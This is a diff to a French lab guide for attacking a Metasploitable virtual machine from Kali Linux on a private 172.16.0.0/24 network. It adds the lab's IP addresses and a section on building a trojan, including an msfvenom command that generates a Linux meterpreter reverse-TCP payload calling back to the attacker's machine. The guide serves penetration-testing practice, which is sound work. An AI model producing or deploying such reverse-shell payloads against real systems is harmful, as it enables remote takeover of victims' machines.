@@ -1,5 +1,11 @@
 # Prérequis :
-> Une machine Kali Linux (ici Kali v2025.2) et une machine Metasploitable
+```
+> Une machine Kali Linux (ici Kali v2025.2)
+> Une machine Metasploitable
+> Kali : 172.16.0.30
+                                              } 172.16.0.0/24
+> Metasploitable : 172.16.0.102
+```
 
 # Dans la console Kali
 ```
@@ -94,3 +100,17 @@ set RHOST 172.16.0.102
 run
 ```
 
+# Exploit n°4 : Cheval de Troie avec msfvenom
+```
+msfconsole
+```
+
+# Afficher l'aide pour msfvenom
+```
+msfvenom -h
+```
+
+# Création d'un payload
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=172.16.0.30
+```
